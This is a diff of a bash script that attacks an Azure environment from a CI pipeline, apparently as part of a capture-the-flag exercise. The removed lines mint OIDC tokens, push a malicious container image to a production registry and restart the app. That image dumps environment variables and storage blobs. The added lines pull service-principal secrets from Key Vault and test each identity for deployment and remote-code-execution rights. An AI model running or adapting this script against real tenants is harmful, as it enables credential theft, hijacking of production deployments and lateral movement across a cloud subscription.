@@ -1,99 +1,39 @@
 #!/usr/bin/env bash
-set -x
+# Deploy/RCE capability matrix across all principals + find other RGs/apps + resolve 7a85156a.
+set +e
+SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"; APP="app-tbl-storefront-prod"
+ACR="crtblplatprodx3euoz"; AUD="api://AzureADTokenExchange"
+mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
+oidc(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
+spk(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials -d "client_secret=$2" --data-urlencode "scope=$3" | jq -r .access_token; }
+la(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
+jwtacc(){ python3 -c "import sys,base64,json;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));print(','.join(a.get('actions',[])[0:5] and [x for ac in d.get('access',[]) for x in ac.get('actions',[])]))" "$1" 2>/dev/null; }
+KVP=$(oidc "https://vault.azure.net/.default"); getsec(){ curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r .value; }
 
-az login --federated-token "$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)" \
-  --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --output none 2>&1 || true
-az account set -s "$AZURE_SUBSCRIPTION_ID" 2>&1 || true
+echo "### other RGs + subscription-wide sites/storage (via OIDC)"
+MG=$(oidc https://management.azure.com/.default)
+curl -s -H "Authorization: Bearer $MG" "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | jq -r '.value[]?.name, (.error.code//empty)'
+echo "sites sub-wide: $(curl -s -H "Authorization: Bearer $MG" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Web/sites?api-version=2023-12-01" | jq -r '.value[]?.name, (.error.code//empty)' | tr '\n' ' ')"
+echo "### resolve 7a85156a via graph (directory-audit)"
+DA=$(getsec directory-audit-principal); GT=$(spk "$(echo "$DA"|jq -r .appId)" "$(echo "$DA"|jq -r .clientSecret)" "https://graph.microsoft.com/.default")
+curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals(appId='7a85156a-01c4-4e61-8472-40a92107159b')" | jq -c '{displayName,servicePrincipalType,accountEnabled,alternativeNames,appOwnerOrganizationId, error:.error.code}'
 
-# === APPROACH 1: ACR admin credentials ===
-# If ACR admin is enabled, we can get admin user/password via Reader role
-echo "=== ACR ADMIN CREDENTIALS ==="
-az acr credential show -n crtblplatprodx3euoz 2>&1 | head -c 300
+declare -a P=("OIDC|_o_|_" "legacy|_l_|_")
+for s in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
+  S=$(getsec "$s"); P+=("$s|$(echo "$S"|jq -r .appId)|$(echo "$S"|jq -r .clientSecret)"); done
+tok(){ case "$2" in _o_) oidc "$3";; _l_) la "$3";; *) spk "$2" "$3" "$4";; esac; }
 
-# === APPROACH 2: ACR login + push (replace app image) ===
-echo "=== ACR LOGIN ==="
-az acr login -n crtblplatprodx3euoz 2>&1 | head -c 200
-
-# === APPROACH 3: Use ACR token to push ===
-echo "=== ACR PUSH TEST ==="
-# Get ACR token via OIDC
-OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
-# Exchange OIDC for ACR token
-ACR_REFRESH=$(curl -s -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
-  -d "grant_type=access_token&service=crtblplatprodx3euoz.azurecr.io&tenant=$AZURE_TENANT_ID" \
-  -d "access_token=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-    -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
-    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-    -d "client_assertion=$OIDC" \
-    --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)" | jq -r .refresh_token)
-echo "ACR refresh token len: ${#ACR_REFRESH}"
-
-if [ ${#ACR_REFRESH} -gt 10 ]; then
-  # Get push scope token
-  ACR_PUSH=$(curl -s -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
-    -d "grant_type=refresh_token&service=crtblplatprodx3euoz.azurecr.io&scope=repository:tebamoto-reporting-api:push,pull&refresh_token=$ACR_REFRESH" | jq -r .access_token)
-  echo "ACR push token len: ${#ACR_PUSH}"
-  
-  if [ ${#ACR_PUSH} -gt 10 ] && [ "$ACR_PUSH" != "null" ]; then
-    echo "=== CAN PUSH TO ACR! Building malicious image... ==="
-    
-    # Create a simple app that dumps env vars
-    mkdir -p /tmp/evil-app
-    cat > /tmp/evil-app/app.py << 'PYEOF'
-import os, json
-from flask import Flask
-app = Flask(__name__)
-@app.route('/')
-def index():
-    env = {k:v for k,v in os.environ.items()}
-    return json.dumps(env, indent=2)
-@app.route('/flag')
-def flag():
-    conn = os.environ.get('CONFIG_STORAGE_CONNECTION', '')
-    if conn:
-        from azure.storage.blob import BlobServiceClient
-        svc = BlobServiceClient.from_connection_string(conn)
-        container = os.environ.get('CONFIG_CONTAINER', 'config')
-        # List all blobs
-        cc = svc.get_container_client(container)
-        blobs = [b.name for b in cc.list_blobs()]
-        # Read each blob
-        data = {}
-        for b in blobs:
-            bc = svc.get_blob_client(container, b)
-            data[b] = bc.download_blob().readall().decode(errors='replace')
-        return json.dumps({'blobs': blobs, 'data': data, 'env_keys': list(os.environ.keys())}, indent=2)
-    return json.dumps({'error': 'no connection string', 'env_keys': list(os.environ.keys())})
-PYEOF
-    cat > /tmp/evil-app/requirements.txt << 'REQEOF'
-flask>=3.0
-gunicorn>=22.0
-azure-storage-blob>=12.19.0
-REQEOF
-    cat > /tmp/evil-app/Dockerfile << 'DEOF'
-FROM python:3.12-slim
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
-COPY app.py .
-CMD ["gunicorn", "-b", "0.0.0.0:8000", "app:app"]
-DEOF
-    
-    # Build and push
-    cd /tmp/evil-app
-    docker build -t crtblplatprodx3euoz.azurecr.io/tebamoto-reporting-api:latest . 2>&1 | tail -5
-    
-    # Push using token
-    echo "$ACR_PUSH" | docker login crtblplatprodx3euoz.azurecr.io -u "00000000-0000-0000-0000-000000000000" --password-stdin 2>&1
-    docker push crtblplatprodx3euoz.azurecr.io/tebamoto-reporting-api:latest 2>&1 | tail -10
-    
-    echo "=== IMAGE PUSHED! App will restart with new image ==="
-    echo "=== After restart, visit /flag endpoint ==="
-  fi
-fi
-
-# === APPROACH 4: webapp restart to pick up new image ===
-echo "=== RESTART APP ==="
-az webapp restart -n app-tbl-storefront-prod -g rg-tbl-platform-prod-sea 2>&1
-
+echo "### DEPLOY CAPABILITY MATRIX"
+for e in "${P[@]}"; do IFS='|' read -r N A K <<<"$e"
+  T=$(tok "$N" "$A" "$K" "https://management.azure.com/.default"); [ ${#T} -lt 50 ] && { echo "[$N] no tok"; continue; }
+  PUB=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-12-01")
+  RST=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/restart?api-version=2023-12-01")
+  PATCHC=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: Bearer $T" -H 'Content-Type: application/json' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/web?api-version=2023-12-01" -d '{"properties":{}}')
+  AAD_SCM=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" "https://$APP.scm.azurewebsites.net/api/settings")
+  # ACR push scope
+  RT=$(curl -s -X POST "https://$ACR.azurecr.io/oauth2/exchange" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=access_token&service=$ACR.azurecr.io&tenant=$TEN&access_token=$T" | jq -r .refresh_token)
+  ACRT=$(curl -s -X POST "https://$ACR.azurecr.io/oauth2/token" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&service=$ACR.azurecr.io&scope=repository:tebamoto-reporting-api:pull,push&refresh_token=$RT" | jq -r '.access_token//empty')
+  ACRACT=$(python3 -c "import sys,base64,json;p='$ACRT'.split('.')[1];p+='='*(-len(p)%4);print([a.get('actions') for a in json.loads(base64.urlsafe_b64decode(p)).get('access',[])])" 2>/dev/null)
+  echo "[$N] publishcreds=$PUB restart=$RST configW=$PATCHC scmAAD=$AAD_SCM acrScope=$ACRACT"
+done
 echo "=== DONE ==="
